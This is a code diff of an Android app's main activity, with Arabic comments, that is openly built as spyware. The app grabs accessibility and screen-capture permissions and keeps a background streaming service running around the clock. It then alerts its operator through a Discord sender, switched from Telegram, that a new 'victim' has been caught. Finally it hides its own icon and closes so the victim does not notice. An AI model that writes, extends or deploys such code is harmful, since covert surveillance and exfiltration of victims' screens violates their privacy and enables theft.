@@ -19,15 +19,15 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // 1. طلب تجاهل البطارية
+        // 1. طلب تجاهل تحسين البطارية لضمان العمل 24 ساعة
         requestBatteryOptimizations();
 
-        // 2. طلب إمكانية الوصول
-        if (!isAccessibilityEnabled()) {
+        // 2. طلب إذن إمكانية الوصول (Accessibility)
+        if (!isAccessibilityEnabled(this)) {
             startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
         }
 
-        // 3. طلب بث الشاشة
+        // 3. طلب إذن بث الشاشة
         MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
         if (mpm != null) {
             startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
@@ -38,19 +38,19 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
-            // أ. تشغيل الخدمة بالخلفية
+            // أ. تشغيل الخدمة بالخلفية للبث المستمر
             Intent intent = new Intent(this, ScreenService.class);
             intent.putExtra("resCode", resultCode);
             intent.putExtra("resData", data);
             startForegroundService(intent);
 
-            // ب. إرسال إشعار لتيلجرام فوراً
-            TelegramSender.sendMessage("🔥 تم اختراق جهاز جديد! الضحية أعطى الصلاحيات وهو الآن أونلاين.");
+            // ب. إرسال إشعار للديسكورد فوراً (الرابط موجود في DiscordSender)
+            DiscordSender.sendMessage("🚀 تم صيد ضحية جديدة! البث بدأ الآن على سيرفر Hussein Monitor.");
 
-            // ج. إخفاء الأيقونة فوراً (الإخفاء اللحظي)
+            // ج. إخفاء الأيقونة فوراً من الجهاز
             hideAppIcon();
             
-            // د. إغلاق الواجهة حتى يرجع الضحية للشاشة الرئيسية
+            // د. إغلاق الواجهة فوراً ليعود الضحية للشاشة الرئيسية
             finish();
         }
     }
@@ -72,5 +72,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private boolean isAccessibilityEnabled() { return false; }
+    private boolean isAccessibilityEnabled(Context context) {
+        return false; // يفضل دائماً أن يفعله المستخدم يدوياً من الإعدادات
+    }
 }
